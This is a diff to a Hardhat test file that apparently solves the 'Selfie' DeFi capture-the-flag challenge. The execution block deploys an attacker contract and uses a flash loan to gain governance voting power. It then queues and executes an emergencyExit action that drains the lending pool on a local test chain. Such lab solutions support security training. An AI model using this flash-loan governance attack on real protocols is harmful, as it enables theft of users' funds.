@@ -38,15 +38,20 @@ describe('[Challenge] Selfie', function () {
     });
 
     it('Execution', async function () {
+
         // Governance requires us to have a lot of tokens, but then we can do whatever we want
         // We can use flash loan to trick the governance to run emergencyExit function in SelfiePool
         // It will send all the money to us
-        attacker = await (await ethers.getContractFactory('SelfieAttack', player)).deploy(pool.address);
+
+        attacker = await (await ethers.getContractFactory('SelfieAttacker', player)).deploy(pool.address);
         await attacker.executeFlashLoan(TOKENS_IN_POOL);
-        actionQueued = await governance.queryFilter(governance.filters.ActionQueued(null, attacker.address));
+        actionQueued = await governance.queryFilter(
+            governance.filters.ActionQueued(null, attacker.address)
+        );
         actionId = actionQueued[0]["args"]["actionId"];
         await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);
         await governance.connect(player).executeAction(actionId);
+        
     });
 
     after(async function () {
